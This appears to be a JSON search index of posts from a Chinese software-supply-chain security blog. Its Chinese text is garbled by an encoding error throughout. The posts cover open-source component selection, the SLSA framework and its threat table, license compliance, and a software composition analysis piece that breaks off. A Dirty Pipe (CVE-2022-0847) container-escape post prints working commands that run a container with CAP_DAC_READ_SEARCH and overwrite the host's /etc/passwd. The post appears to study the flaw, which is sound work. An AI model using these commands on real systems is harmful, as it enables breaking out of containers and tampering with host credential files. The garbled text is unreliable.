ç³»ç»Ÿä½¿ç”¨çš„å¤–éƒ¨ä¾èµ–åº“è¿›è¡Œç»Ÿä¸€æ‰«æï¼Œä»¥å…¨é¢æŠŠæ§å’Œä¿®å¤ä¸æ–­æš´éœ²å‡ºçš„å¤–éƒ¨ä¾èµ–åº“æ¼æ´ã€‚\n\nå¤–éƒ¨ä¾èµ–åº“æ£€æµ‹å¯éµå¾ªå·¥å…·æ‰«æã€æ’é™¤è¯¯æŠ¥ã€åˆ¶å®šä¿®å¤å»ºè®®ã€å®æ–½ä¿®å¤çš„æµç¨‹è¿›è¡Œï¼Œå½¢æˆæ£€æµ‹å’Œä¿®å¤æŠ¥å‘Šï¼Œä½œä¸ºå¼€å‘é˜¶æ®µäº¤ä»˜ç‰©ã€‚å¯¹äºçº¿ä¸Šç³»ç»Ÿï¼Œå¯ä»¥æ„å»ºç»„ä»¶æ¸…å•åˆ—è¡¨ï¼Œéµå¾ªåŸºäºç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„å®‰å…¨è§£å†³æ–¹æ¡ˆï¼Œç»“åˆç»„ä»¶å¨èƒæƒ…æŠ¥ï¼Œä¸€æ—¦æŸä¸ªå¼€æºç»„ä»¶å‡ºç°æ¼æ´ï¼Œå¯ä»¥é€šè¿‡æ¸…å•åˆ—è¡¨è¿…é€Ÿæ’æŸ¥ã€‚ä»¥ä¸‹æ˜¯åŸºäºå¼€æºè½¯ä»¶ç”Ÿå‘½å‘¨æœŸçš„ä¾›åº”é“¾å®‰å…¨è§£å†³æ–¹æ¡ˆï¼šå¯å»ºç«‹å¯¹åº”çš„æµç¨‹å’Œå·¥å…·é“¾ã€‚\n\né€‰å‹é˜¶æ®µ\nå‡†å…¥é˜¶æ®µ\nä½¿ç”¨é˜¶æ®µ\nè¿ç»´é˜¶æ®µ\né”€æ¯é˜¶æ®µ\n\næ€»ç»“\n æŒç»­æ„å»ºç‰©æ–™æ¸…å•:ä¸ºæ¯ä¸ªåº”ç”¨ç¨‹åºæŒç»­æ„å»ºè¯¦ç»†çš„è½¯ä»¶ææ–™æ¸…å•ï¼Œä»è€Œå…¨é¢æ´å¯Ÿæ¯ä¸ªåº”ç”¨è½¯ä»¶çš„ç»„ä»¶æƒ…å†µã€‚å¦‚æœå­˜åœ¨æ— æ³•éªŒè¯æ¥æºçš„å¼€æºç»„ä»¶ï¼Œåˆ™ä¸å…è®¸ä½¿ç”¨ã€‚â€”â€”ç›®å‰çš„è§£å†³æ–¹æ¡ˆä½¿ç”¨DT+CycloneDX+Jenkinsæ„å»ºè½¯ä»¶æ¸…å•å¹¶å¯¹ç¬¬ä¸‰æ–¹å¼€æºè½¯ä»¶åç§°&amp;ç‰ˆæœ¬è¿›è¡Œé™åˆ¶ âœ… 2022-08-22\n å¼ºåŒ–è½¯ä»¶ä¾›åº”é“¾:é€šè¿‡å¼ºåŒ–è½¯ä»¶ä¾›åº”é“¾æ¥é™ä½å®‰å…¨é£é™©ã€‚è¿™åŒ…æ‹¬æ£€æŸ¥å†…éƒ¨å’Œå¤–éƒ¨æºä»£ç ã€æ”¯æŒè„šæœ¬ã€é…ç½®æ–‡ä»¶å’Œå…¶ä»–å·¥ä»¶ï¼Œå¹¶åˆ›å»ºå¯ä¿¡å¼€æºç»„ä»¶çš„å†…éƒ¨å­˜å‚¨åº“ã€‚è€Œå¯¹å¤–éƒ¨å­˜å‚¨åº“çš„ä½¿ç”¨è¦åˆç†ç®¡ç†ã€‚    \n é£é™©ç®¡ç†:é€šè¿‡åˆ¶å®šç­–ç•¥ç¡®å®šå¯æ¥å—çš„å¼€æºç»„ä»¶â€”â€”è§£å†³æ–¹æ¡ˆå¦‚ä¸Š âœ… 2022-08-22\n å¯¹åœ¨ä»£ç ä¸­å‘ç°æ¼æ´æˆ–å—é™è½¯ä»¶è®¸å¯çš„åˆç†å“åº”ï¼Œæ¥ç®¡ç†é£é™©â€”â€”æœªå¼€å±•IAST&amp;RAST&amp;SASTç­‰æ–¹æ¡ˆ\n\nReferences\næµ…è°ˆå¼€æºè½¯ä»¶ä¾›åº”é“¾é£é™©\n\n","slug":"å¼€æºè½¯ä»¶é€‰å‹åŠå®‰å…¨æŒ‡æ ‡å‚è€ƒ","date":"2022-06-20T01:01:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"å¼€æºè½¯ä»¶å®‰å…¨æŒ‡æ ‡,openbase","author_index":"Moses"},{"id":"7af1666f1830041ec06497fadc48c24a","title":"è½¯ä»¶ä¾›åº”é“¾çº§åˆ«SLSA","content":"è½¯ä»¶ä¾›åº”é“¾çº§åˆ«SLSAæ¦‚è¿°å’ŒèƒŒæ™¯SLSA â€¢ Supply-chain Levels for Software Artifactsè¿™æ˜¯ä¸€ä¸ªå®‰å…¨æ¡†æ¶ï¼Œæ˜¯æ ‡å‡†å’Œæ§åˆ¶çš„æ¸…å•ï¼Œä»¥é˜²æ­¢ç¯¡æ”¹ï¼Œæé«˜å®Œæ•´æ€§ï¼Œå¹¶ä¿æŠ¤é¡¹ç›®ã€ä¼ä¸šæˆ–ä¼ä¸šä¸­çš„è½¯ä»¶åŒ…å’ŒåŸºç¡€è®¾æ–½ã€‚è¿™å°±æ˜¯ä½ å¦‚ä½•åœ¨é“¾æ¡ä¸­çš„ä»»ä½•ç¯èŠ‚ä»è¶³å¤Ÿå®‰å…¨åˆ°å°½å¯èƒ½æœ‰å¼¹æ€§ã€‚è¯¥é¡¹ç›®ç›®å‰å¤„äºalphaçŠ¶æ€ã€‚GitHub - slsa-framework&#x2F;slsa: Supply-chain Levels for Software Artifacts\nSLSAç”¨é€”SLSAå¸®åŠ©é˜²èŒƒå¸¸è§çš„è½¯ä»¶ä¾›åº”é“¾æ”»å‡»ã€‚ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„è½¯ä»¶ä¾›åº”é“¾ï¼ŒåŒ…æ‹¬å¯èƒ½å‘ç”Ÿåœ¨ä¾›åº”é“¾å„ä¸ªç¯èŠ‚çš„æ”»å‡»ç¤ºä¾‹ã€‚åœ¨è¿‡å»çš„å‡ å¹´ä¸­ï¼Œæ¯ç§ç±»å‹çš„æ”»å‡»å‡å‘ç”Ÿè¿‡ï¼Œä¸å¹¸çš„æ˜¯ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œè½¯ä»¶ä¾›åº”é“¾äº‹ä»¶æ”»å‡»ä»åœ¨å¢åŠ ã€‚\nçº§åˆ«æ‘˜è¦\n\n\næ°´å¹³\næè¿°\nä¾‹å­\n\n\n\n1\næ„å»ºè¿‡ç¨‹çš„æ–‡æ¡£\næœªç­¾åæ¥æº\n\n\n2\næ„å»ºæœåŠ¡çš„é˜²ç¯¡æ”¹æ€§\næ‰˜ç®¡æº&#x2F;æ„å»ºï¼Œç­¾åæ¥æº\n\n\n3\nå¯¹ç‰¹å®šå¨èƒçš„é¢å¤–æŠµæŠ—åŠ›\nå¯¹ä¸»æœºçš„å®‰å…¨æ§åˆ¶ï¼Œä¸å¯ä¼ªé€ çš„æ¥æº\n\n\n4\næœ€é«˜æ°´å¹³çš„ä¿¡å¿ƒå’Œä¿¡ä»»\nåŒæ–¹è¯„è®º+å¯†å°æ„å»º\n\n\nè¯¦ç»†è§£é‡Š\n\n\næ°´å¹³\nè¦æ±‚\n\n\n\n0\næ²¡æœ‰ä¿è¯ã€‚SLSA 0è¡¨ç¤ºç¼ºä¹ä»»ä½•SLSAçº§åˆ«ã€‚\n\n\n1\næ„å»ºè¿‡ç¨‹å¿…é¡»å®Œå…¨è„šæœ¬åŒ–&#x2F;è‡ªåŠ¨åŒ–å¹¶ç”Ÿæˆæ¥æºã€‚æ¥æºæ˜¯å…³äºå·¥ä»¶å¦‚ä½•æ„å»ºçš„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬æ„å»ºè¿‡ç¨‹ã€é¡¶çº§æºä»£ç å’Œä¾èµ–é¡¹ã€‚äº†è§£æ¥æºå…è®¸è½¯ä»¶æ¶ˆè´¹è€…åšå‡ºåŸºäºé£é™©çš„å®‰å…¨å†³ç­–ã€‚SLSA 1çš„æ¥æºä¸èƒ½é˜²æ­¢ç¯¡æ”¹ï¼Œä½†å®ƒæä¾›äº†åŸºæœ¬æ°´å¹³çš„ä»£ç æºè¯†åˆ«ï¼Œå¹¶å¯ä»¥å¸®åŠ©æ¼æ´ç®¡ç†ã€‚\n\n\n2\néœ€è¦ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶å’Œç”Ÿæˆç»è¿‡èº«ä»½éªŒè¯çš„æ¥æºçš„æ‰˜ç®¡æ„å»ºæœåŠ¡ã€‚è¿™äº›é¢å¤–çš„è¦æ±‚ä½¿è½¯ä»¶æ¶ˆè´¹è€…å¯¹è½¯ä»¶çš„èµ·æºæ›´æœ‰ä¿¡å¿ƒã€‚åœ¨è¿™ä¸ªçº§åˆ«ä¸Šï¼Œæ¥æºå¯ä»¥é˜²æ­¢ç¯¡æ”¹ï¼Œä»¥è‡³äºæ„å»ºæœåŠ¡å—åˆ°ä¿¡ä»»ã€‚SLSA 2è¿˜æä¾›äº†ä¸€ä¸ªç®€å•çš„SLSA 3å‡çº§è·¯å¾„ã€‚\n\n\n3\næºå¹³å°å’Œæ„å»ºå¹³å°åˆ†åˆ«ç¬¦åˆç‰¹å®šæ ‡å‡†ï¼Œä»¥ä¿è¯æºçš„å¯å®¡è®¡æ€§å’Œæ¥æºçš„å®Œæ•´æ€§ã€‚æˆ‘ä»¬è®¾æƒ³äº†ä¸€ä¸ªè®¤è¯æµç¨‹ï¼Œæ ¹æ®è¯¥æµç¨‹ï¼Œå®¡è®¡å¸ˆè¯æ˜å¹³å°ç¬¦åˆè¦æ±‚ï¼Œç„¶åæ¶ˆè´¹è€…å¯ä»¥ä¾èµ–è¿™äº›è¦æ±‚ã€‚SLSA 3é€šè¿‡é˜²æ­¢ç‰¹å®šç±»åˆ«çš„å¨èƒï¼Œå¦‚è·¨å»ºç­‘æ±¡æŸ“ï¼Œæ¯”æ—©æœŸæ°´å¹³æä¾›äº†æ›´å¼ºçš„é˜²ç¯¡æ”¹ä¿æŠ¤ã€‚\n\n\n4\néœ€è¦å¯¹æ‰€æœ‰æ›´æ”¹è¿›è¡Œä¸¤äººå®¡æŸ¥ï¼Œä»¥åŠå¯†å°çš„ã€å¯å¤åˆ¶çš„æ„å»ºè¿‡ç¨‹ã€‚ä¸¤äººè¯„è®ºæ˜¯è¯†åˆ«é”™è¯¯å’Œé˜»æ­¢ä¸è‰¯è¡Œä¸ºçš„è¡Œä¸šæœ€ä½³å®è·µã€‚Hermeticæ„å»ºä¿è¯æ¥æºçš„ä¾èµ–é¡¹åˆ—è¡¨æ˜¯å®Œæ•´çš„ã€‚å¯å¤åˆ¶çš„æ„å»ºè™½ç„¶ä¸æ˜¯ä¸¥æ ¼è¦æ±‚ï¼Œä½†æä¾›äº†è®¸å¤šå¯å®¡è®¡æ€§å’Œå¯é æ€§ä¼˜åŠ¿ã€‚æ€»ä½“è€Œè¨€ï¼ŒSLSA 4ç»™äº†æ¶ˆè´¹è€…é«˜åº¦çš„ä¿¡å¿ƒï¼Œå³è¯¥è½¯ä»¶æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚\n\n\nå¨èƒä¸ç¼“è§£æªæ–½\n\n\n\nåºå·\nå¨èƒç±»å‹\nå¨èƒæ¡ˆä¾‹\nSLSAé˜²å¾¡\n\n\n\nA\nå°†æ¶æ„ä»£ç æäº¤åˆ°æºå­˜å‚¨åº“\nLinuxæ¶æ„ä¸Šä¼ å¸¦æœ‰æ¼æ´çš„patchï¼šç ”ç©¶äººå‘˜è¯•å›¾é€šè¿‡é‚®ä»¶åˆ—è¡¨ä¸Šçš„è¡¥ä¸ç¨‹åºæ•…æ„å°†æ¼æ´å¼•å…¥Linuxå†…æ ¸ã€‚\nåŒäººå®¡æŸ¥å¯ä»¥å®¡æ ¸å¤§å¤šæ•°ï¼ˆä½†ä¸æ˜¯å…¨éƒ¨çš„ï¼‰æ¼æ´ã€‚\n\n\nB\næ¶æ„æ‰˜ç®¡æºä»£ç ç®¡ç†å¹³å°\nPHPå®˜æ–¹gitè¢«æ”»é™·ï¼šæ”»å‡»è€…ç ´åäº†PHPçš„è‡ªæ‰˜ç®¡gitæœåŠ¡å™¨ï¼Œå¹¶æ³¨å…¥äº†ä¸¤ä¸ªæ¶æ„æäº¤ã€‚\né˜²å¾¡è¾ƒå¥½çš„æºä»£ç å¹³å°å¢åŠ äº†æ”»å‡»è€…éš¾åº¦\n\n\nC\nä½¿ç”¨æ­£å¼æµç¨‹æ„å»ºï¼Œä½†æºä»£ç ä¸æºä»£ç ç®¡ç†ä¸åŒ¹é…\nWebmin:æ”»å‡»è€…ä¿®æ”¹äº†æ„å»ºå·¥ä½œæµä»¥ä½¿ç”¨ä¸æºä»£ç ç®¡ç†ä¸åŒ¹é…çš„æºæ–‡ä»¶ã€‚\nä¸€ä¸ªç¬¦åˆSLSAçš„æ„å»ºæœåŠ¡å™¨ä¼šè¯†åˆ«å®é™…ä½¿ç”¨çš„æºä»£ç ï¼Œå…è®¸ç”¨æˆ·æ£€æµ‹æ­¤ç±»ç¯¡æ”¹ã€‚\n\n\nD\nè¢«æ”»é™·çš„æ„å»ºå¹³å°\nSolarWindsï¼šæ”»å‡»è€…ç ´åäº†æ„å»ºå¹³å°ï¼Œå¹¶æ¤å…¥äº†ä¸€ä¸ªåœ¨æ¯æ¬¡æ„å»ºè¿‡ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç çš„ç¨‹åºã€‚\næ›´é«˜SLSA çº§åˆ«è¦æ±‚æ„å»ºå¹³å°å…·æœ‰å¼ºæœ‰åŠ›çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œç¡®ä¿æ„å»ºå¹³å°å¯ä»¥æŒä¹…æ€§å¹¶ä¸”éš¾ä»¥è¢«ç ´å\n\n\nE\nä½¿ç”¨æ¶æ„çš„ä¾èµ–(å³A-Hï¼Œé€’å½’)\näº‹ä»¶æµæ”»å‡»ï¼šæ”»å‡»è€…æ·»åŠ äº†ä¸€ä¸ªæ— å®³çš„ä¾èµ–é¡¹ï¼Œç„¶åæ›´æ–°è¯¥ä¾èµ–å¹¶æ·»åŠ æ¶æ„ä»£ç ã€‚æ›´æ–°ä¸æäº¤ç»™GitHubçš„ä»£ç ä¸åŒ¹é…ï¼ˆå³æ”»å‡»Fï¼‰\nåœ¨æ‰€æœ‰ä¾èµ–é¡¹ä¸­ä½¿ç”¨SLSAï¼Œå¯èƒ½ä¼šé˜»æ­¢ç‰¹å®šçš„æ”»å‡»ï¼Œå› ä¸ºæºä»£ç å¯èƒ½ä¼šæç¤ºå®ƒä¸æ˜¯ç”±æ­£ç¡®çš„æ„å»ºç¯å¢ƒæ„å»ºçš„ï¼Œæˆ–è€…æºä»£ç ä¸æ˜¯æ¥è‡ªGitHubã€‚\n\n\nF\nä¸Šä¼ ä¸æ˜¯ç”±CI&#x2F;CDç³»ç»Ÿç”Ÿæˆçš„ä¸­é—´ä»¶\nCodeCovï¼šæ”»å‡»è€…ä½¿ç”¨æ³„éœ²çš„è¯ä¹¦å°†æ¶æ„ä¸­é—´ä»¶ä¸Šä¼ åˆ°GCSå­˜å‚¨åº“ï¼Œç”¨æˆ·å¯ä»¥ä»ä¸Šé¢ç›´æ¥ä¸‹è½½ã€‚\nGCSå­˜å‚¨åº“ä¸­ï¼Œä¸­é—´ä»¶çš„å‡ºå¤„ä¼šæ˜¾ç¤ºä¸­é—´ä»¶ä¸æ˜¯ä»¥é¢„æœŸçš„æ–¹å¼ä»é¢„æœŸçš„æºæ„å»ºçš„ã€‚\n\n\nG\næ¶æ„çš„è½¯ä»¶ä»“åº“\næ”»å‡»è½¯ä»¶é•œåƒç«™ï¼šç ”ç©¶äººå‘˜æµ‹è¯•å‡ ä¸ªæµè¡Œçš„è½¯ä»¶é•œåƒç«™ï¼Œè¿™äº›é•œåƒç«™å¯èƒ½ä¼šè¢«ç”¨æ¥æ‰˜ç®¡æ¶æ„è½¯ä»¶\nä¸ä¸Šé¢çš„ï¼ˆFï¼‰ç±»ä¼¼ï¼Œæ¶æ„ç»„ä»¶çš„å‡ºå¤„ä¼šæ˜¾ç¤ºå®ƒä»¬ä¸æ˜¯æŒ‰ç…§é¢„æœŸæ„å»ºçš„ï¼Œæˆ–è€…ä¸æ˜¯ä»é¢„æœŸçš„æºrepoæ„å»ºçš„ã€‚\n\n\nH\næ¬ºéª—ç”¨æˆ·ä½¿ç”¨æ¶æ„çš„è½¯ä»¶åŒ…\nåŒ…åæŠ¢æ³¨: æ”»å‡»è€…ä¸Šä¼ äº†ä¸€ä¸ªä¸åŸå§‹æ–‡ä»¶åç›¸ä¼¼çš„æ¶æ„è½¯ä»¶ã€‚\nSLSAä¸èƒ½ç›´æ¥è§£å†³è¿™ä¸ªå¨èƒï¼Œä½†æ˜¯é€šè¿‡æ§åˆ¶æºä»£ç é“¾æ¥å’Œå¢åŠ å…¶ä»–è§£å†³æ–¹æ¡ˆæ¥è§£å†³ã€‚\n\n\n\n\n\n\nå¯ç”¨æ€§å¨èƒ\nå·²çŸ¥çš„ä¾‹å­\nSLSAå¦‚ä½•æä¾›å¸®åŠ©\n\n\n\nE\nä¾èµ–é¡¹å˜å¾—ä¸å¯ç”¨\nMimemagicï¼šç»´æŠ¤äººå‘˜æ•…æ„ä»å­˜å‚¨åº“ä¸­åˆ é™¤è½¯ä»¶åŒ…æˆ–è½¯ä»¶åŒ…ç‰ˆæœ¬ï¼Œæ²¡æœ‰è­¦å‘Šã€‚ç½‘ç»œé”™è¯¯æˆ–æœåŠ¡ä¸­æ–­ä¹Ÿå¯èƒ½ä½¿è½¯ä»¶åŒ…æš‚æ—¶ä¸å¯ç”¨ã€‚\nSLSAæ²¡æœ‰ç›´æ¥åº”å¯¹è¿™ä¸€å¨èƒã€‚\n\n\n[[ä¾›åº”é“¾æ”»å‡»å®‰å…¨å¯ç¤º-SolarWindsäº‹ä»¶åˆ†æ]]\nè½¯ä»¶ä¾›åº”é“¾çº§åˆ«SLSAè¯„ä¼°æ¡ˆä¾‹-kubeedgeå®‰å…¨å®¡è®¡æŠ¥å‘Š![[KubeEdge-security-audit-2022.pdf]]\nReferences\ncosignä½¿ç”¨æ‰‹å†ŒDetailed Usage - sigstore documentation\nSLSAæœ¯è¯­SLSA â€¢ Terminology\nSLSA æ¡†æ¶ä¸è½¯ä»¶ä¾›åº”é“¾å®‰å…¨é˜²æŠ¤ - çŸ¥ä¹\nä»BABåˆ°SLSAâ€”â€”è°ˆGoogleçš„è½¯ä»¶ä¾›åº”é“¾é£é™©æ²»ç† - çŸ¥ä¹\nGitHub - slsa-framework&#x2F;slsa: Supply-chain Levels for Software Artifacts\n\n","slug":"è½¯ä»¶ä¾›åº”é“¾çº§åˆ«SLSA","date":"2022-06-19T15:28:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,SLSA,å®‰å…¨æ¡†æ¶,æˆç†Ÿåº¦","author_index":"Moses"},{"id":"a848febdecd13e7af1ad2da3100c5412","title":"å¼€è½¯è½¯ä»¶åˆè§„é£é™©ææ–™æ•´ç†","content":"ä¸€ã€å¼€æºæ¦‚è¿°åŠå¼€æºé£é™©åˆ†æå¼€æºåˆè§„ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¼€æºæ¦‚è¿°åŠå¼€æºé£é™©åˆ†æ\näºŒã€å¼€æºè®¸å¯è¯å¼€æºåˆè§„ç³»åˆ—ï¼ˆäºŒï¼šä¸Šï¼‰ï¼šå¼€æºè®¸å¯è¯ä¹‹GPLã€AGPLã€LGPLã€MPLå¼€æºåˆè§„ç³»åˆ—ï¼ˆäºŒï¼šä¸‹ï¼‰ï¼šå¼€æºè®¸å¯è¯ä¹‹Apacheã€MITã€BSDåŠè®¸å¯è¯å…¼å®¹æ€§åˆ†æ\nä¸‰ã€å¼€æºåˆè§„ç³»åˆ—ï¼ˆä¸‰ï¼‰ï¼šå¼€æºåˆè§„å»ºè®®åŠè®¸å¯è¯çƒ­ç‚¹é—®é¢˜è§£æå¼€æºåˆè§„ç³»åˆ—ï¼ˆä¸‰ï¼‰ï¼šå¼€æºåˆè§„å»ºè®®åŠè®¸å¯è¯çƒ­ç‚¹é—®é¢˜è§£æ\n","slug":"å¼€æºåˆè§„","date":"2022-06-19T08:43:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,å¼€æºè½¯ä»¶é£é™©åˆè§„,èµ„æ–™æ•´ç†","author_index":"Moses"},{"id":"b2ff5f03ec5fcb6c8c71d036621f3f9f","title":"å®¹å™¨å®‰å…¨æ¼æ´åˆ†æ-åˆ©ç”¨CVE-2022-0847ï¼ˆDirty Pipe)å®ç°å®¹å™¨é€ƒé€¸","content":"åˆ©ç”¨CVE-2022-0847ï¼ˆDirty Pipeï¼‰å®ç°å®¹å™¨é€ƒé€¸0x00 èƒŒæ™¯ç®€ä»‹GitHub - greenhandatsjtu&#x2F;CVE-2022-0847-Container-Escape: CVE-2022-0847 used to achieve container escape åˆ©ç”¨CVE-2022-0847 (Dirty Pipe) å®ç°å®¹å™¨é€ƒé€¸æ¥æºäºä¸Šæµ·äº¤å¤§ç½‘ç»œä¸ç³»ç»Ÿå®‰å…¨å®éªŒå®¤çš„åˆ†äº«\n0x01 æ¼æ´æ¦‚è¦CVE-2022-0847ä»‹ç»\n2022 å¹´ 03 æœˆ 7 æ—¥ï¼Œå®‰å…¨ç ”ç©¶å‘˜ Max Kellermann æŠ«éœ²äº†ä¸€ä¸ª Linux å†…æ ¸æœ¬åœ°æ æƒæ¼æ´ CVE-2022-0847ï¼Œå‘½åä¸º Dirty Pipe [[Dirty PipeææƒCVE-2022-0847]]\nç”±äº pipe_buffer ç»“æ„ä½“æœªæ­£ç¡®åˆå§‹åŒ–ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´å‘åªè¯»æ–‡ä»¶çš„é¡µç¼“ å­˜å†™å…¥æ•°æ®\n\nCAP_DAC_READ_SEARCHâ€¢ ç”¨äºæ‰“å¼€æ–‡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ openat() å¯ä»¥æ‹†åˆ†ä¸ºä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨1 name_to_handle_at() ç”¨äºå¾—åˆ°ç›®æ ‡æ–‡ä»¶çš„å¥æŸ„open_by_handle_at() æ ¹æ®ä¼ å…¥çš„æ–‡ä»¶å¥æŸ„æ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œå¾—åˆ°æ–‡ä»¶æè¿°ç¬¦\nâ€¢ CAP_DAC_READ_SEARCH çš„æƒé™åŒ…æ‹¬ç»•è¿‡è¯»å–æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æƒé™æ£€æŸ¥ã€æ‰§è¡Œ open_by_handle_at() ç³»ç»Ÿè°ƒç”¨\nâ€¢ è‹¥å®¹å™¨è¢«èµ‹äºˆ CAP_DAC_READ_SEARCHï¼Œåˆ™èƒ½ç»•è¿‡å®¹å™¨éš”ç¦»ï¼Œéå†å®¿ä¸»æœºæ–‡ ä»¶ç³»ç»Ÿå¹¶è¯»å–ä»»æ„æ–‡ä»¶\n\n\n\n\n\n\n\n\n\næ–‡ä»¶å¥æŸ„åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶å¥æŸ„é•¿åº¦ä¸º 8 ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­å‰ 4 ä¸ªå­—èŠ‚ä¸ºæ–‡ ä»¶çš„ inode å·\n\nè‹¥å®¹å™¨è¢«èµ‹äºˆ CAP_DAC_READ_SEARCHï¼Œæ”»å‡»è€…å¯åœ¨å®¹å™¨å†… éƒ¨éå†å®¿ä¸»æœº inodeï¼Œæ‰¾åˆ°ç›®æ ‡æ–‡ä»¶ inode å·(å æ®å¥æŸ„å‰ 4 å­—èŠ‚)\n\néšåæš´åŠ›ç ´è§£æ–‡ä»¶å¥æŸ„å 4 å­—èŠ‚ï¼Œå³å¯æ‰¾åˆ°æŒ‡å‘è¯¥æ–‡ä»¶çš„å¥æŸ„\n\næœ€åè°ƒç”¨ open_by_handle_at() å³å¯é€šè¿‡è¯¥å¥æŸ„æ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œ å¾—åˆ°æ–‡ä»¶æè¿°ç¬¦\n\n\n0x02 æ¼æ´åˆ©ç”¨é¡¹ç›®åœ°å€\ncp &#x2F;etc&#x2F;password . # back up &#x2F;etc&#x2F;password\ngcc dp.c -o dp\ndocker run --rm -it -v $(pwd):&#x2F;exp --cap-add&#x3D;CAP_DAC_READ_SEARCH ubuntu\n&#x2F;exp&#x2F;dp &#x2F;etc&#x2F;passwd 1 ootz: # overwrite &#x2F;etc&#x2F;password on host from offset 1\n&#x2F;etc&#x2F;dp &#x2F;etc&#x2F;passwd # dump &#x2F;etc&#x2F;passwd on host\n0x03 æ€»ç»“\nå°† CVE-2022-0847 æ¼æ´ä¸å·²æœ‰ CAP_DAC_READ_SEARCH é€ƒé€¸è·¯å¾„ç»“åˆï¼Œå®¹å™¨å†…éƒ¨èƒ½è¦†å†™å®¿ä¸»æœºä¸Šçš„åªè¯»æ–‡ä»¶\n\nä»…èƒ½å†™å…¥é¡µç¼“å­˜ï¼Œè‹¥ç¼“å­˜æ²¡æœ‰å†™å›ï¼Œåˆ™ä¸èƒ½å®ç°æŒä¹…åŒ–ï¼Œç¼“å­˜å¤±æ•ˆ&#x2F;é‡å¯åæ–‡ä»¶æ¢å¤\n\n\n0x04 References0x05 å…³äºæ¼æ´çš„æ€è€ƒ\n å¾…éªŒè¯\n\n","slug":"åˆ©ç”¨CVE-2022-0847ï¼ˆDirty Pipeï¼‰å®ç°å®¹å™¨é€ƒé€¸","date":"2022-06-18T08:37:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"CVE-2022-0847,DirtyPipe,å®¹å™¨é€ƒé€¸,æ¼æ´åˆ†æ","author_index":"Moses"},{"id":"e996202d66a481abb2ff37739071b61f","title":"SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢","content":"SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢æ¦‚è¿°å’ŒèƒŒæ™¯SCAæ¦‚å¿µSCA(Software Composition Analysis)è½¯ä»¶æˆåˆ†åˆ†ææŠ€æœ¯ä¸»è¦å°±æ˜¯é’ˆå¯¹å¼€æºè½¯ä»¶ä»¥åŠç¬¬ä¸‰æ–¹å•†ä¸šè½¯ä»¶è®¾è®¡çš„å„ç§æºç ã€æºç åº“ã€æ¨¡å—å’Œæ¡†æ¶ï¼Œè¯†åˆ«å’Œæ¸…ç‚¹å¼€æºè½¯ä»¶çš„ç»„ä»¶åŠå…¶æ„æˆå’Œä¾èµ–å…³ç³»ï¼Œå¹¶è¯†åˆ«å·²çŸ¥çš„å®‰å…¨æ¼æ´æˆ–æ½œåœ¨çš„è®¸å¯æˆæƒé—®é¢˜ï¼Œäº‰å–åœ¨åº”ç”¨ç³»ç»Ÿä¸Šçº¿å‰å‘ç°å¹¶è§£å†³è¿™äº›é£é™©ã€‚å®ƒæœ‰åŠ©äºç¡®ä¿ä¼ä¸šè½¯ä»¶ä¾›åº”é“¾ä»…åŒ…å«å®‰å…¨çš„ç»„ä»¶ï¼Œä»è€Œæ”¯æŒå®‰å…¨åº”ç”¨ç¨‹åºå¼€å‘å’Œç»„è£…ã€‚\nSCAéœ€æ±‚\næ”¯æŒå¤šç§è¯­è¨€çš„æ·±åº¦æ‰«æèƒ½åŠ›\nå…·å¤‡CI&#x2F;CDé›†æˆè‡ªåŠ¨åŒ–èƒ½åŠ›ï¼Œå¹¶ä¸”å°†å…¶æ‰«æç»“æœä½œä¸ºäº¤ä»˜è´¨é‡å…³å¡ã€ä¿è¯è½¯ä»¶äº¤ä»˜è´¨é‡\nå…·å¤‡å¯è§†åŒ–æ¼æ´åˆ†ææŠ¥è¡¨å’ŒlicenseæŠ¥è¡¨ï¼Œä»¥å¯è§†åŒ–æ¼æ´çš„ç›‘ç®¡èƒ½åŠ›å’Œå¯è§†åŒ–ä¼ä¸šä½¿ç”¨licenseçš„æƒ…å†µ\næ‹¥æœ‰å¯¹å¼€æºæ¼æ´æ•°æ®åº“ã€å•†ä¸šæ¼æ´æ•°æ®åº“ã€æœ¬åœ°æ¼æ´æ•°æ®ä¸­å¿ƒå’Œå…¶ä»–æ¼æ´æ‰«æå·¥å…·çš„é›†æˆèƒ½åŠ›ï¼Œé€šè¿‡ä¸åŒçš„æ¼æ´æ•°æºä¸°å¯ŒSCAå·¥å…·å¯¹ç¬¬ä¸‰æ–¹å®‰å…¨æ¼æ´çš„åˆ¤æ–­èƒ½åŠ›\nèƒ½å¤Ÿè¿›è¡Œæ­£å‘ä¾èµ–åˆ†æä»è€Œå®šä½æ¼æ´ä½ç½®ï¼Œä»¥åŠè¿›è¡Œåå‘ä¾èµ–åˆ†æè‡ªåŠ¨åŒ–åœ°åˆ†ææ¼æ´çš„å½±å“èŒƒå›´\nè‡ªå®šä¹‰å‘Šè­¦é…ç½®ã€é€šçŸ¥å’Œè‡ªåŠ¨åŒ–èƒ½åŠ›ï¼Œä»¥æä¾›ä¼ä¸šæ¼æ´çš„å¿«é€Ÿå“åº”èƒ½åŠ›\n\næ¼æ´æ•°æ®åº“google å¼€æºæ´è§Open Source 